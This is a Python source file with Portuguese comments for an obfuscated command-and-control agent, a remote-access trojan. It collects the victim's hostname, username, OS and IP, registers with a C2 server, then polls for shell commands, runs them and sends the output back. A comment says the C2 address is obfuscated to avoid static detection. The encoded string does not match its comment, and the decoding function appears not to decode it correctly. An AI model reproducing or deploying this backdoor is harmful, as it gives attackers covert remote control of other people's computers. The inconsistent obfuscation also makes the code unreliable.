import os
import sys
import time
import uuid
import socket
import platform
import subprocess
import requests
import json
import base64
import threading
from datetime import datetime

# Ofuscação básica de strings
def d(s):
    """Decodifica string base64 reversa"""
    return base64.b64decode(s[::-1]).decode()

class ObfuscatedAgent:
    def __init__(self):
        # Strings ofuscadas para evitar detecção estática
        self.c2_url = d("b2xpdmttLy86cHR0aA==")  # http://localhost:5000
        self.agent_id = None
        self.interval = 5
        
    def get_system_info(self):
        """Coleta informações do sistema"""
        return {
            'hostname': socket.gethostname(),
            'username': os.getlogin(),
            'os_version': platform.platform(),
            'ip': socket.gethostbyname(socket.gethostname())
        }
    
    def register(self):
        """Registra no servidor C2"""
        info = self.get_system_info()
        info['agent_id'] = self.agent_id or str(uuid.uuid4())
        
        try:
            response = requests.post(f"{self.c2_url}/register", json=info, timeout=10)
            if response.status_code == 200:
                data = response.json()
                self.agent_id = data['agent_id']
                print(f"[+] Registrado com sucesso! ID: {self.agent_id}")
                return True
        except Exception as e:
            print(f"[-] Erro no registro: {e}")
        return False
    
    def execute_command(self, command):
        """Executa comando no sistema"""
        try:
            # Comandos comuns do Windows
            if command.lower().startswith('cd '):
                os.chdir(command[3:])
                return f"Diretório alterado para: {os.getcwd()}"
            
            result = subprocess.run(command, shell=True, 
                                  capture_output=True, text=True, timeout=30)
            
            output = result.stdout if result.stdout else result.stderr
            if not output:
                output = "[+] Comando executado sem saída"
            
            return output
        except subprocess.TimeoutExpired:
            return "[-] Comando timeout após 30 segundos"
        except Exception as e:
            return f"[-] Erro: {str(e)}"
    
    def heartbeat(self):
        """Loop principal - pega e executa comandos"""
        while True:
            try:
                # Pega tarefas pendentes
                response = requests.get(f"{self.c2_url}/tasks", 
                                       params={'agent_id': self.agent_id},
                                       timeout=10)
                
                if response.status_code == 200:
                    data = response.json()
                    tasks = data.get('tasks', [])
                    
                    for task in tasks:
                        print(f"[*] Executando: {task['command']}")
                        result = self.execute_command(task['command'])
                        
                        # Envia resultado
                        requests.post(f"{self.c2_url}/results", json={
                            'agent_id': self.agent_id,
                            'task_id': task['id'],
                            'result': result
                        }, timeout=10)
                        
                        print(f"[+] Resultado enviado (task {task['id']})")
                
                time.sleep(self.interval)
                
            except Exception as e:
                print(f"[-] Heartbeat error: {e}")
                time.sleep(self.interval * 2)  # Espera mais em caso de erro
    
    def run(self):
        """Inicia o agente"""
        print("""
        ╔════════════════════════════════╗
        ║   🦠 C2 AGENT INITIALIZED 🦠   ║
        ╚════════════════════════════════╝
        """)
        
        if self.register():
            print("[+] Heartbeat iniciado. Aguardando comandos...")
            self.heartbeat()
        else:
            print("[-] Falha no registro. Tentando novamente em 30 segundos...")
            time.sleep(30)
            self.run()

if __name__ == '__main__':
    agent = ObfuscatedAgent()
    agent.run()